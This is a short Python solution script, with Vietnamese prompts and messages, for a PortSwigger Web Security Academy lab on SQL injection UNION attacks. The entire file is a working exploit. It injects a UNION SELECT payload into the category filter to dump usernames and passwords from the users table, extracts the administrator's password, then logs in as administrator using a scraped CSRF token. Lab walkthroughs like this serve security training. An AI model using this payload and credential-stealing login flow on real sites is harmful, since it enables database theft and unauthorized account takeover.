#Lab: SQL injection UNION attack, retrieving multiple values in a single column
import requests
from bs4 import BeautifulSoup

print("Nhập URL giống như này (pls): https://(your-lab-id).web-security-academy.net/ ")
base_url = input("Nhập URL: ").rstrip("/")

union_url = f"{base_url}/filter?category=Gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users--"
response = requests.get(union_url)
soup = BeautifulSoup(response.text, "html.parser")
admin_password = None
for th in soup.find_all("th"):
    if "administrator~" in th.text:
        admin_password = th.text.split("~", 1)[1].strip()
        break
if not admin_password:
    print("[-] Không tìm thấy mật khẩu administrator")
    exit()
print(f"[+] Mật khẩu administrator: {admin_password}")
print(f"[!] Bắt đầu đăng nhập...")

# Đăng nhập
login_url = f"{base_url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf,
    "username": "administrator",
    "password": admin_password
}
response = session.post(login_url, data=data)

if (response.status_code == 200):
    print("[+] Ngon, đăng nhập vào được rồi.")
else:
    print("[-] Thua, ca này khó vl bố chịu.")
